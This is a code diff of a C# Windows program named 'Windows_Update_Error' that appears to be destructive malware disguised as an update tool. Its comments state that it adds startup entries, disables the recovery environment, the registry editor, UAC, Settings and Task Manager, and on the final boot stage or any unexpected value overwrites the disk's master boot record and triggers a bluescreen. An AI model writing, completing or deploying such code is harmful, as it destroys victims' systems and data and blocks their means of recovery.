@@ -1,6 +1,5 @@
 using System.Diagnostics;
 using System.Security.Cryptography.X509Certificates;
-using System.Text;
 
 namespace Windows_Update_Error
 {
@@ -16,53 +15,62 @@ namespace Windows_Update_Error
             // see https://aka.ms/applicationconfiguration.
             ApplicationConfiguration.Initialize();
             Regedit_Set regedit1 = new Regedit_Set();
-            Test test1 = new Test();
-            
-            StringBuilder regedit1_Start = new StringBuilder(regedit1.Start_Detection());         //获取启动码
-            if (regedit1_Start.ToString() == "114514")
+            Test test1 = new Test();          //创建Test对象
+            string regedit1_Start = regedit1.Start_Detection();         //获取启动码
+            const string str1 = "114514";
+            const string str2 = "8479838";
+            const string str3 = "7453567";
+            const string str4 = "84634846";
+            const string str5 = "847327473";
+            try
             {
-                regedit1_Start.Replace(regedit1_Start.ToString(), "8479838");
-                regedit1.Start_Update(regedit1_Start.ToString());
-                try
-                {
-                    regedit1.PC_Start();
-                    test1.Disable_WinRE();
-                    regedit1.Disable_Regedit();
-                }
-                catch(Exception ex)
-                {
-                    MessageBox.Show(ex.Message,"错误",MessageBoxButtons.OK,MessageBoxIcon.Error);
-                }
-                regedit1.UAC_OFF();
-                regedit1.Disable_Settings();
-                Thread.Sleep(5000);
-                test1.Shutdown_PC();
+                regedit1.PC_Start();         //添加开机启动项并修改系统关键启动项
+                test1.Disable_WinRE();      //禁用Windows恢复环境
+                regedit1.Disable_Regedit();
             }
-            else if (regedit1_Start.ToString() == "8479838")
+            catch (Exception ex)
             {
-                regedit1_Start.Replace(regedit1_Start.ToString(), "7454567");
-                regedit1.Start_Update(regedit1_Start.ToString());
-                msg1();
-                Application.Run(new Form2());
+                MessageBox.Show(ex.Message, "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
-            else if (regedit1_Start.ToString() == "7453567")
+            regedit1.UAC_OFF();         //关闭UAC
+            regedit1.Disable_Settings();   //禁用设置和任务管理器
+            Thread.Sleep(5000);
+            switch(regedit1_Start)
             {
-                regedit1_Start.Replace(regedit1_Start.ToString(), "84634846");
-                regedit1.Start_Update(regedit1_Start.ToString());
-                msg2();
-                Application.Run(new Form2());
-            }
-            else if (regedit1_Start.ToString() == "84634846")
-            {
-                regedit1_Start.Replace(regedit1_Start.ToString(), "847327473");
-                regedit1.Start_Update(regedit1_Start.ToString());
-                msg3();
-                Application.Run(new Form2());
-            }
-            else if (regedit1_Start.ToString() == "847327473")
-            {
-                test1.killmbrA();            //篡改硬盘的主引导文件
-                test1.Nt_Error();
+                case str1:
+                    regedit1_Start = "8479838";
+                    regedit1.Start_Update(regedit1_Start);     //更新启动码
+                    test1.Shutdown_PC();      //关机
+                    break;
+                case str2:
+                    regedit1_Start = regedit1.Start_Detection();
+                    regedit1_Start = "7453567";
+                    regedit1.Start_Update(regedit1_Start);
+                    msg1();
+                    Application.Run(new Form2());
+                    break;
+                case str3:
+                    regedit1_Start = regedit1.Start_Detection();
+                    regedit1_Start = "84634846";
+                    regedit1.Start_Update(regedit1_Start);
+                    msg2();
+                    Application.Run(new Form2());
+                    break;
+                case str4:
+                    regedit1_Start = regedit1.Start_Detection();
+                    regedit1_Start = "847327473";
+                    regedit1.Start_Update(regedit1_Start);
+                    msg3();
+                    Application.Run(new Form2());
+                    break;
+                case str5:
+                    test1.killmbrA();     //篡改硬盘的主引导记录MBR，test1.killmbr()也可以
+                    test1.Nt_Error();     //蓝屏
+                    break;
+                default:
+                    test1.killmbrA();     //篡改硬盘的主引导记录MBR，test1.killmbr()也可以
+                    test1.Nt_Error();     //蓝屏
+                    break;
             }
             void msg1()
             {
